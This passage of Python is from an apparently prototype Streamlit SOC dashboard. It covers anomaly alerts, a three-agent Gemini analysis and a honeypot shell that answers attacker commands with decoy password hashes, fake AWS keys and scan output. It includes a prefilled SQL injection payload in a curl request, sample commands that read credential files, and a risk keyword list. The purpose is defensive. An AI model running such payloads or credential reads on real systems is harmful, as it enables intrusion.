        ag3 = call_gemini_api(p3, key, primary_model=model)

        return ag1, ag2, ag3, True, ""

    except Exception as e:
        err_msg = str(e)
        if allow_fallback:
            ag1, ag2, ag3 = get_deterministic_agent_analysis(log_record, blast_info)
            return ag1, ag2, ag3, False, f"API query failed: {err_msg} (Using offline fallback)"
        return None, None, None, False, err_msg


# ==========================================
# 7. HONEYPOT DECOY ENGINE & TARPIT RESPONDER
# ==========================================
def respond_honeypot_command(cmd, api_key="", model="gemini-1.5-flash"):
    """Generate deceptive Linux bash responses dynamically via Gemini API or fallback."""
    cmd = cmd.strip()
    if not cmd:
        return ""
        
    key = api_key.strip() if api_key else ""
    if key and not key.startswith("AQ."):
        prompt = (
            f"You are a simulated Ubuntu 22.04 LTS decoy server honeypot terminal shell. "
            f"An adversary executed this bash command: '{cmd}'. "
            f"Generate convincing, realistic Linux shell output (e.g. realistic user credentials, dummy processes, fake system files, decoy tokens). "
            f"Do NOT output markdown code blocks or explanations, output only raw bash terminal text."
        )
        url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={key}"
        try:
            resp = requests.post(url, headers={"Content-Type": "application/json"}, json={
                "contents": [{"parts": [{"text": prompt}]}],
                "generationConfig": {"temperature": 0.3}
            }, timeout=6)
            if resp.status_code == 200:
                parts = resp.json().get('candidates', [{}])[0].get('content', {}).get('parts', [{}])
                text = parts[0].get('text', '').strip()
                cleaned = clean_llm_json(text)
                return cleaned
        except Exception:
            pass

    cmd_lower = cmd.lower()
    if "whoami" in cmd_lower:
        return "root"
    elif "id" in cmd_lower:
        return "uid=0(root) gid=0(root) groups=0(root)"
    elif "cat /etc/shadow" in cmd_lower or "shadow" in cmd_lower:
        return """root:$6$k8Lp9$qXz5B1g:19820:0:99999:7:::
daemon:*:19820:0:99999:7:::
bin:*:19820:0:99999:7:::
sys:*:19820:0:99999:7:::
admin:$6$vU7x1$mN9p2K:19820:0:99999:7:::
db_backup:$6$aZ9w8$jK3L5P:19820:0:99999:7:::"""
    elif "cat /etc/passwd" in cmd_lower:
        return """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
admin:x:1000:1000:System Administrator:/home/admin:/bin/bash
db_backup:x:1001:1001:Database Backup Daemon:/home/db_backup:/bin/bash"""
    elif "sudo -i" in cmd_lower or "sudo" in cmd_lower:
        return "[sudo] password for admin: \nAccess Granted. Session logged."
    elif "nmap" in cmd_lower:
        return """Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-25 03:15 UTC
Nmap scan report for 10.0.0.5 (AUTH-SRV-AD.corp.internal)
Host is up (0.00042s latency).
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
445/tcp open  microsoft-ds
3389/tcp open ms-wbt-server
Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds"""
    elif "ls" in cmd_lower or "dir" in cmd_lower:
        return "total 48\ndrwxr-xr-x 4 root root 4096 Aug 25 02:10 .\ndrwxr-xr-x 20 root root 4096 Aug 24 18:00 ..\n-rw------- 1 root root 2048 Aug 25 02:08 .bash_history\n-rw-r--r-- 1 root root  420 Aug 24 19:30 payroll_export_credentials.env\n-rw-r--r-- 1 root root 8192 Aug 24 20:15 db_backup_key.pem"
    elif "cat" in cmd_lower and "env" in cmd_lower or "payroll" in cmd_lower:
        return "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nDB_PASS=DecoySuperSecretPass2026!"
    elif "pwd" in cmd_lower:
        return "/root"
    elif "env" in cmd_lower:
        return "USER=root\nHOME=/root\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSHELL=/bin/bash\nHONEYPOT_MODE=ACTIVE_TRAP"
    else:
        return f"bash: {cmd}: command executed. Output suppressed to stderr."


# ==========================================
# 8. SESSION STATE MANAGERS & CALLBACKS
# ==========================================
if "current_index" not in st.session_state:
    st.session_state.current_index = 0
if "is_playing" not in st.session_state:
    st.session_state.is_playing = False
if "attacker_playbook" not in st.session_state:
    st.session_state.attacker_playbook = []
if "terminal_history" not in st.session_state:
    st.session_state.terminal_history = [
        {"cmd": "systemctl status honey-agent", "output": "honey-agent.service - CyberSentinel Dynamic Tarpit Shell\n   Loaded: loaded (/etc/systemd/system/honey-agent.service; enabled)\n   Active: active (running) since Tue 2026-08-25 00:00:01 UTC\n   Status: Ready to intercept and profile adversary interaction."}
    ]
if "resolved_anomalies" not in st.session_state:
    st.session_state.resolved_anomalies = set()
if "action_status" not in st.session_state:
    st.session_state.action_status = None
if "gemini_api_key" not in st.session_state:
    st.session_state.gemini_api_key = INITIAL_GEMINI_KEY
if "selected_model" not in st.session_state:
    st.session_state.selected_model = "gemini-1.5-flash"
if "allow_fallback" not in st.session_state:
    st.session_state.allow_fallback = False

# Callback functions
def cb_play():
    st.session_state.is_playing = True

def cb_pause():
    st.session_state.is_playing = False

def cb_step():
    if st.session_state.current_index < len(ALL_LOGS):
        st.session_state.current_index += 1

def cb_reset():
    st.session_state.current_index = 0
    st.session_state.is_playing = False
    st.session_state.action_status = None
    st.session_state.resolved_anomalies = set()

def cb_isolate(node):
    st.session_state.action_status = {
        "type": "ISOLATE",
        "msg": f"EXECUTION CONFIRMED: Node '{node}' isolated via Network Security Group firewall rules.",
        "level": "error"
    }
    st.session_state.resolved_anomalies.add(node)

def cb_route_honeypot(node, payload, ip_addr):
    st.session_state.action_status = {
        "type": "HONEYPOT",
        "msg": f"DECOY ACTIVE: Adversary IP '{ip_addr}' successfully rerouted to Dynamic Honey-Agent shell.",
        "level": "success"
    }
    cmd_to_trap = payload if payload else "whoami"
    active_key = st.session_state.get("gemini_api_key", INITIAL_GEMINI_KEY)
    active_model = st.session_state.get("selected_model", "gemini-1.5-flash")
    try:
        resp = respond_honeypot_command(cmd_to_trap, api_key=active_key, model=active_model)
    except Exception:
        resp = "root"
    st.session_state.terminal_history.append({"cmd": cmd_to_trap, "output": resp})
    st.session_state.attacker_playbook.append({
        "timestamp": datetime.datetime.now().strftime("%H:%M:%S"),
        "source_ip": ip_addr,
        "target_node": node,
        "command": cmd_to_trap,
        "risk": "CRITICAL"
    })
    st.session_state.resolved_anomalies.add(node)

def cb_dismiss(node):
    st.session_state.action_status = {
        "type": "DISMISS",
        "msg": f"Alert on node '{node}' dismissed by Incident Commander.",
        "level": "info"
    }
    st.session_state.resolved_anomalies.add(node)


# ==========================================
# 9. SIDEBAR CONFIGURATION & API ENGINE SETUP
# ==========================================
with st.sidebar:
    st.title("CyberSentinel AutoSOC")
    st.caption("Autonomous SecOps • Live Multi-Agent AI")
    st.markdown("---")
    
    st.subheader("🔑 Gemini AI Configuration")
    user_key_input = st.text_input(
        "Google Gemini API Key",
        value=st.session_state.gemini_api_key,
        type="password",
        help="Paste your Google AI Studio API key (starts with AIzaSy...)",
        key="sidebar_key_field"
    )
    if user_key_input != st.session_state.gemini_api_key:
        st.session_state.gemini_api_key = user_key_input.strip()
        st.rerun()

    c_save, c_clear = st.columns(2)
    with c_save:
        if st.button("Save to .env", use_container_width=True, help="Saves key locally so you do not have to enter it again"):
            if user_key_input.strip():
                if save_gemini_key_to_env(user_key_input.strip()):
                    st.success("Saved to .env!")
                else:
                    st.error("Failed to write .env")
            else:
                st.warning("Key is empty")
    with c_clear:
        if st.button("Clear Key", use_container_width=True):
            st.session_state.gemini_api_key = ""
            save_gemini_key_to_env("")
            st.rerun()

    model_options = ["gemini-1.5-flash", "gemini-2.0-flash", "gemini-1.5-pro"]
    current_model = st.session_state.selected_model if st.session_state.selected_model in model_options else "gemini-1.5-flash"
    chosen_model = st.selectbox(
        "Target AI Model",
        model_options,
        index=model_options.index(current_model),
        help="Fast, multi-agent reasoning model"
    )
    st.session_state.selected_model = chosen_model

    st.session_state.allow_fallback = st.checkbox(
        "Allow Offline Fallback (if API fails)",
        value=st.session_state.allow_fallback,
        help="When unchecked, forces 100% real live API calls with no pre-defined flags."
    )

    st.markdown("---")
    st.subheader("API Connectivity Status")
    active_key = st.session_state.gemini_api_key
    api_online, api_status_msg = check_api_health(active_key, model=chosen_model)
    
    if api_online:
        st.markdown(f"""
        <div style='background: rgba(0, 255, 102, 0.1); border: 1px solid #00ff66; padding: 12px; border-radius: 8px;'>
            <div style='display: flex; justify-content: space-between; align-items: center;'>
                <span style='font-size: 0.82rem; color: #00ff66; font-weight: 800;'>GEMINI API ONLINE</span>
                <span class='badge-normal'>200 OK</span>
            </div>
            <div style='font-size: 0.75rem; color: #cbd5e1; margin-top: 6px;'>Active Model: <b>{chosen_model}</b></div>
            <div style='font-size: 0.72rem; color: #94a3b8; margin-top: 2px;'>Mode: Live Multi-Agent Pipeline</div>
        </div>
        """, unsafe_allow_html=True)
    else:
        status_badge = "KEY NEEDED" if not active_key else "OFFLINE"
        st.markdown(f"""
        <div style='background: rgba(255, 0, 60, 0.1); border: 1px solid #ff003c; padding: 12px; border-radius: 8px;'>
            <div style='display: flex; justify-content: space-between; align-items: center;'>
                <span style='font-size: 0.82rem; color: #ff003c; font-weight: 800;'>GEMINI API {status_badge}</span>
                <span class='badge-critical'>FAIL</span>
            </div>
            <div style='font-size: 0.75rem; color: #cbd5e1; margin-top: 6px;'>Notice: {api_status_msg}</div>
            <div style='font-size: 0.72rem; color: #ffbf00; margin-top: 2px;'>Strict API Mode: {'Disabled (Fallback ON)' if st.session_state.allow_fallback else 'Active (No Fake Flags)'}</div>
        </div>
        """, unsafe_allow_html=True)

    st.markdown("---")
    st.subheader("Stream Telemetry Controls")
    stream_speed = st.slider("Stream Delay (sec)", 0.5, 3.0, 1.0, step=0.5)
    
    col_play, col_pause, col_step = st.columns(3)
    with col_play:
        st.button("PLAY", on_click=cb_play, use_container_width=True)
    with col_pause:
        st.button("PAUSE", on_click=cb_pause, use_container_width=True)
    with col_step:
        st.button("STEP", on_click=cb_step, use_container_width=True)
                
    st.button("RESET STREAM", on_click=cb_reset, use_container_width=True)

    st.markdown("---")
    st.subheader("UEBA ML Tuning")
    contamination = st.slider("Isolation Forest Contamination", 0.05, 0.30, 0.15, step=0.01)


# ==========================================
# 10. MAIN APP & TABBED LAYOUT
# ==========================================

# Top Header Bar
st.title("CyberSentinel: Autonomous SOC MVP")
st.markdown("##### Enterprise UEBA Anomaly Detection • 3-Agent Multi-LLM Debate • Blast Radius Matrix")

# Evaluate logs up to current index
current_logs = ALL_LOGS[:st.session_state.current_index]

processed_records = []
anomaly_records = []

for log in current_logs:
    is_anom, p_score, dec_func = analyze_log_ueba(log, ueba_model)
    rec = {**log, "is_anomaly": is_anom, "anomaly_score": p_score}
    processed_records.append(rec)
    if is_anom:
        anomaly_records.append(rec)

# Filter out resolved/contained anomalies
active_anomaly_records = [
    log for log in anomaly_records 
    if log['target_system'] not in st.session_state.resolved_anomalies
]

latest_anomaly = active_anomaly_records[-1] if active_anomaly_records else None
blast_info = calculate_blast_radius(latest_anomaly['target_system'], INFRA_GRAPH) if latest_anomaly else None

# Top Metrics Bar
m1, m2, m3, m4 = st.columns(4)
with m1:
    st.metric("Total Logs Processed", f"{len(processed_records)} / {len(ALL_LOGS)}")
with m2:
    st.metric("Active Errors Pending", len(active_anomaly_records), delta=f"{len(st.session_state.resolved_anomalies)} Resolved" if st.session_state.resolved_anomalies else "None Resolved", delta_color="normal")
with m3:
    exposure_str = f"${blast_info['total_financial_exposure_per_hr']:,}/hr" if blast_info else "$0/hr"
    st.metric("Financial Downtime Risk", exposure_str)
with m4:
    st.metric("Honeypot Traps Active", f"{len(st.session_state.attacker_playbook)} Trapped")

st.markdown("---")

# Clean Tabbed Workspace
tab_soc, tab_honey, tab_infra = st.tabs([
    "SOC Command & Multi-Agent Arena",
    "Dynamic Honey-Agent Shell & Playbook",
    "Infrastructure Dependency Graph"
])


# ==========================================
# TAB 1: SOC COMMAND & AGENT ARENA
# ==========================================
with tab_soc:
    col_left, col_right = st.columns([5, 7])
    
    # Left Column: Telemetry Feed
    with col_left:
        st.subheader("Security Anomaly Telemetry Stream")
        
        progress_val = len(processed_records) / len(ALL_LOGS) if ALL_LOGS else 0.0
        st.progress(progress_val)
        
        st.caption(f"Showing **{len(active_anomaly_records)}** active security error alerts ({len(st.session_state.resolved_anomalies)} resolved).")
        
        st.markdown("<div style='max-height: 580px; overflow-y: auto; padding-right: 6px;'>", unsafe_allow_html=True)
        
        display_list = active_anomaly_records
        
        if not display_list:
            if st.session_state.resolved_anomalies:
                st.success("All flagged security threats in current stream window have been isolated, trapped, or resolved!")
            else:
                st.info("No security error logs detected in current stream window. Click PLAY or STEP to continue telemetry analysis.")
        else:
            for log in reversed(display_list):
                st.markdown(f"""
                <div class="soc-card-red">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span class="badge-critical">UEBA ANOMALY DETECTED</span>
                        <span style="color: #cbd5e1; font-size: 0.8rem;">{log['timestamp']}</span>
                    </div>
                    <div style="margin-top: 8px; font-weight: 700; color: #ffffff;">
                        {log['event_type']} &bull; <span style="color: #ff003c;">{log['target_system']}</span>
                    </div>
                    <div style="font-size: 0.85rem; color: #94a3b8; margin-top: 4px;">
                        User: <b>{log['employee_id']}</b> | IP: <code>{log['source_ip']}</code>
                    </div>
                    <div style="font-size: 0.8rem; color: #ffbf00; margin-top: 4px;">
                        Vol: {log['data_volume_mb']} MB | Failed Att: {log['failed_attempts']} | Login Hr: {log['login_hour']}:00
                    </div>
                    <div style="font-size: 0.78rem; background: #050811; color: #00f0ff; padding: 6px; border-radius: 4px; font-family: monospace; margin-top: 6px; overflow-x: auto;">
                        {log['payload_signature']}
                    </div>
                </div>
                """, unsafe_allow_html=True)
                
        st.markdown("</div>", unsafe_allow_html=True)
        
        st.markdown("<div style='margin-top: 14px;'></div>", unsafe_allow_html=True)
        with st.expander("🧪 Send Custom Bug / Incident Log to API", expanded=False):
            st.caption("Submit any custom bug, exploit signature, or telemetry event to audit live via the Multi-Agent API.")
            with st.form("custom_bug_form"):
                cb_c1, cb_c2 = st.columns(2)
                with cb_c1:
                    c_target = st.selectbox("Target Node", list(INFRA_GRAPH.keys()), index=0)
                    c_event = st.selectbox("Bug / Event Type", [
                        "SQL_INJECTION",
                        "REMOTE_CODE_EXECUTION",
                        "PRIVILEGE_ESCALATION",
                        "ZERO_DAY_PAYLOAD",
                        "SSRF_EXFIL",
                        "REVERSE_SHELL",
                        "BULK_EXPORT"
                    ])
                    c_ip = st.text_input("Adversary Source IP", value="198.51.100.77")
                with cb_c2:
                    c_user = st.text_input("Identity / Account", value="EMP_UNKNOWN (Red Team)")
                    c_vol = st.number_input("Data Volume (MB)", value=520.0, step=50.0)
                    c_failed = st.number_input("Failed Attempts", value=22, step=1)
                c_payload = st.text_area("Payload Signature", value="curl -X POST https://api.corp.internal/v1/auth/token -d 'username=admin&pass=\" OR 1=1--'")
                if st.form_submit_button("🚀 SEND BUG TO API & AUDIT", use_container_width=True):
                    custom_record = {
                        "timestamp": datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
                        "employee_id": c_user,
                        "source_ip": c_ip,
                        "target_system": c_target,
                        "event_type": c_event,
                        "login_hour": datetime.datetime.now().hour,
                        "data_volume_mb": float(c_vol),
                        "failed_attempts": int(c_failed),
                        "payload_signature": c_payload
                    }
                    ALL_LOGS.insert(0, custom_record)
                    st.session_state.current_index = max(1, st.session_state.current_index + 1)
                    st.rerun()

    # Right Column: 3-Agent Consensus & Blast Radius Action
    with col_right:
        st.subheader("3-Agent Consensus & Action Center")
        
        if not latest_anomaly:
            st.info("Awaiting anomaly detection to trigger multi-agent consensus debate.")
        else:
            # Run 3-agent debate via live API
            with st.spinner("Dispatching 3 Autonomous Agents for Consensus Debate via Live API..."):
                ag1, ag2, ag3, is_live_api, debate_err = run_3_agent_debate(
                    latest_anomaly, 
                    blast_info,
                    api_key=st.session_state.gemini_api_key,
                    model=st.session_state.selected_model,
                    allow_fallback=st.session_state.allow_fallback
                )

            st.markdown(f"**Target Under Analysis:** `{latest_anomaly['target_system']}` | **Source IP:** `{latest_anomaly['source_ip']}`")

            if ag1 is None:
                st.markdown(f"""
                <div class="soc-card-red" style="border: 1px solid #ff003c; padding: 18px;">
                    <div style="font-weight: 800; color: #ff003c; font-size: 1.05rem; display: flex; align-items: center; gap: 8px;">
                        <span>⚠️ LIVE API ANALYSIS REQUIRED (NO PRE-DEFINED FLAGS)</span>
                    </div>
                    <div style="color: #e2e8f0; font-size: 0.88rem; margin-top: 8px;">
                        The system did NOT use pre-defined flags because <b>Strict API Mode</b> is enabled.
                    </div>
                    <div style="background: rgba(255, 0, 60, 0.12); color: #ff8090; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.82rem; margin-top: 10px; word-break: break-all;">
                        {debate_err}
                    </div>
                    <div style="color: #94a3b8; font-size: 0.82rem; margin-top: 12px;">
                        👉 <b>Next step:</b> Enter your Google Gemini API Key in the left sidebar under <b>Gemini AI Configuration</b> to evaluate this bug in real time, or toggle <i>'Allow Offline Fallback'</i> in the sidebar if you wish to run heuristic simulations.
                    </div>
                </div>
                """, unsafe_allow_html=True)
            else:
                if is_live_api:
                    st.markdown(f"<div style='margin-bottom: 8px;'><span style='background: rgba(0,255,102,0.15); border: 1px solid #00ff66; color: #00ff66; padding: 4px 10px; border-radius: 4px; font-size: 0.75rem; font-weight: 700;'>LIVE LLM DEBATE (Google {st.session_state.selected_model} Active)</span></div>", unsafe_allow_html=True)
                else:
                    st.markdown(f"<div style='margin-bottom: 8px;'><span style='background: rgba(255,191,0,0.15); border: 1px solid #ffbf00; color: #ffbf00; padding: 4px 10px; border-radius: 4px; font-size: 0.75rem; font-weight: 700;'>OFFLINE HEURISTIC DEBATE (Fallback Active: {debate_err})</span></div>", unsafe_allow_html=True)

                # Agent Debate Cards
                st.markdown(f"""
                <div class="soc-card-red">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span style="font-weight: 800; color: #ff003c;">AGENT 1: THREAT HUNTER (SecOps)</span>
                        <span class="badge-critical">{ag1.get('severity', 'CRITICAL')}</span>
                    </div>
                    <div style="font-size: 0.9rem; color: #00f0ff; margin-top: 6px; font-weight: 600;">
                        Tactic: {ag1.get('threat_tactic', 'N/A')}
                    </div>
                    <div style="font-size: 0.85rem; color: #e2e8f0; margin-top: 4px;">
                        <b>Attacker Intent:</b> {ag1.get('attacker_intent', '')}
                    </div>
                </div>
                """, unsafe_allow_html=True)

                st.markdown(f"""
                <div class="soc-card-blue">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span style="font-weight: 800; color: #0096ff;">AGENT 2: BLAST RADIUS ASSESSOR (DevOps)</span>
                        <span class="badge-info">{ag2.get('blast_radius_tier', 'HIGH')}</span>
                    </div>
                    <div style="font-size: 0.85rem; color: #e2e8f0; margin-top: 4px;">
                        <b>Target Criticality:</b> {ag2.get('criticality')} | <b>Downtime Exposure:</b> ${ag2.get('total_financial_exposure_per_hr', 0):,}/hr
                    </div>
                    <div style="font-size: 0.8rem; color: #94a3b8; margin-top: 4px;">
                        <b>Business Impact:</b> {ag2.get('business_risk_summary', '')}
                    </div>
                </div>
                """, unsafe_allow_html=True)

                st.markdown(f"""
                <div class="soc-card-gold">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span style="font-weight: 800; color: #ffbf00;">AGENT 3: INCIDENT COMMANDER (Arbiter)</span>
                        <span class="badge-normal">CONFIDENCE: {ag3.get('confidence_score', 90)}%</span>
                    </div>
                    <div style="font-size: 1rem; color: #00ff66; margin-top: 6px; font-weight: 800;">
                        RECOMMENDED VERDICT: {ag3.get('final_recommendation', 'Dynamic Honeypot Redirection')}
                    </div>
                    <div style="font-size: 0.85rem; color: #cbd5e1; margin-top: 4px;">
                        <b>Trade-off Resolution:</b> {ag3.get('trade_off_resolution', '')}
                    </div>
                </div>
                """, unsafe_allow_html=True)

                # Action Center Buttons
                st.markdown("##### Human-in-the-Loop Action Center")
                
                c_iso, c_honey, c_dism = st.columns(3)
                
                target_node = latest_anomaly['target_system']
                payload_sig = latest_anomaly.get("payload_signature", "whoami")
                ip_addr = latest_anomaly.get("source_ip", "185.220.101.5")
                
                with c_iso:
                    st.button(
                        "ISOLATE NODE",
                        key="btn_tab1_isolate",
                        on_click=cb_isolate,
                        args=(target_node,),
                        use_container_width=True
                    )
                with c_honey:
                    st.button(
                        "ROUTE TO HONEYPOT",
                        key="btn_tab1_honeypot",
                        on_click=cb_route_honeypot,
                        args=(target_node, payload_sig, ip_addr),
                        use_container_width=True
                    )
                with c_dism:
                    st.button(
                        "DISMISS ALERT",
                        key="btn_tab1_dismiss",
                        on_click=cb_dismiss,
                        args=(target_node,),
                        use_container_width=True
                    )

            # Display persistent Action Status Banner
            if st.session_state.action_status:
                status = st.session_state.action_status
                if status["level"] == "error":
                    st.error(status["msg"])
                elif status["level"] == "success":
                    st.success(status["msg"])
                else:
                    st.info(status["msg"])


# ==========================================
# TAB 2: DYNAMIC HONEY-AGENT SHELL & PLAYBOOK
# ==========================================
with tab_honey:
    t_col1, t_col2 = st.columns([6, 6])

    with t_col1:
        st.markdown("##### Interactive Decoy Ubuntu Bash Shell")
        st.caption("Type Linux commands below to test the decoy tarpit shell responder.")
        
        term_html = "<div class='terminal-container'><div style='max-height: 320px; overflow-y: auto;'>"
        for item in st.session_state.terminal_history:
            term_html += f"<div><span class='terminal-prompt'>root@decoy-srv-01:~#</span> {item['cmd']}</div>"
            term_html += f"<div class='terminal-output'>{item['output']}</div>"
        term_html += "</div></div>"
        
        st.markdown(term_html, unsafe_allow_html=True)
        
        with st.form(key="terminal_form", clear_on_submit=True):
            cmd_input = st.text_input("Enter attacker command (e.g. whoami, cat /etc/shadow, sudo -i, nmap -sS 10.0.0.5):", key="cmd_input_field")
            submit_cmd = st.form_submit_button("EXECUTE COMMAND")
            
        if submit_cmd and cmd_input.strip():
            active_key = st.session_state.get("gemini_api_key", INITIAL_GEMINI_KEY)
            active_model = st.session_state.get("selected_model", "gemini-1.5-flash")
            resp_out = respond_honeypot_command(cmd_input, api_key=active_key, model=active_model)
            st.session_state.terminal_history.append({"cmd": cmd_input, "output": resp_out})
            
            target_sys = latest_anomaly['target_system'] if latest_anomaly else "WEB-PROD-CLUSTER"
            ip_src = latest_anomaly['source_ip'] if latest_anomaly else "185.220.101.5"
            
            st.session_state.attacker_playbook.append({
                "timestamp": datetime.datetime.now().strftime("%H:%M:%S"),
                "source_ip": ip_src,
                "target_node": target_sys,
                "command": cmd_input,
                "risk": "CRITICAL" if any(x in cmd_input.lower() for x in ["shadow", "sudo", "nmap", "cat", "wget"]) else "MEDIUM"
            })
            st.rerun()

    with t_col2:
        st.markdown("##### Extracted Attacker Playbook (Live Trap Log)")
        st.caption("All intercepted adversary commands are cataloged live for forensic threat intelligence.")
        
        if not st.session_state.attacker_playbook:
            st.info("No commands captured in honeypot tarpit yet. Click ROUTE TO HONEYPOT in Tab 1 or type commands in the shell.")
        else:
            df_playbook = pd.DataFrame(st.session_state.attacker_playbook)
            st.dataframe(
                df_playbook,
                use_container_width=True,
                column_config={
                    "timestamp": st.column_config.TextColumn("Time"),
                    "source_ip": st.column_config.TextColumn("Attacker IP"),
                    "target_node": st.column_config.TextColumn("Target Node"),
                    "command": st.column_config.TextColumn("Captured Command"),
                    "risk": st.column_config.TextColumn("Risk Rating")
                },
                hide_index=True
            )


# ==========================================
# TAB 3: INFRASTRUCTURE TOPOLOGY GRAPH
# ==========================================
with tab_infra:
    st.markdown("##### Enterprise Infrastructure & Downtime Exposure Matrix")
    
    infra_rows = []
    for node_id, node_info in INFRA_GRAPH.items():
        b_calc = calculate_blast_radius(node_id, INFRA_GRAPH)
        infra_rows.append({
            "Node ID": node_id,
            "System Name": node_info.get("name"),
            "Criticality": node_info.get("criticality"),
            "Direct Downtime $/hr": f"${node_info.get('downtime_cost_per_hr', 0):,}",
            "Downstream Dependent Services": ", ".join(b_calc["downstream_nodes"]) if b_calc["downstream_nodes"] else "None",
            "Total Risk Exposure $/hr": f"${b_calc['total_financial_exposure_per_hr']:,}",
            "Blast Tier": b_calc["blast_tier"]
        })
        
    df_infra = pd.DataFrame(infra_rows)
    st.dataframe(df_infra, use_container_width=True, hide_index=True)


# Footer
st.markdown("---")
st.markdown("<div style='text-align: center; color: #64748b; font-size: 0.8rem;'>CyberSentinel: AutoSOC Enterprise Architecture Prototype • Built with Streamlit, Scikit-Learn & Integrated Google Gemini AI</div>", unsafe_allow_html=True)


# ==========================================
# 11. END-OF-SCRIPT STREAMER LOOP (FULL RENDER FIRST)
# ==========================================
if st.session_state.is_playing and st.session_state.current_index < len(ALL_LOGS):
    st.session_state.current_index += 1
    newest_log = ALL_LOGS[st.session_state.current_index - 1]
    is_anom, _, _ = analyze_log_ueba(newest_log, ueba_model)
    if is_anom and newest_log['target_system'] not in st.session_state.resolved_anomalies:
        st.session_state.is_playing = False  # Auto-pause on new anomaly for user review
    time.sleep(stream_speed)
    st.rerun()
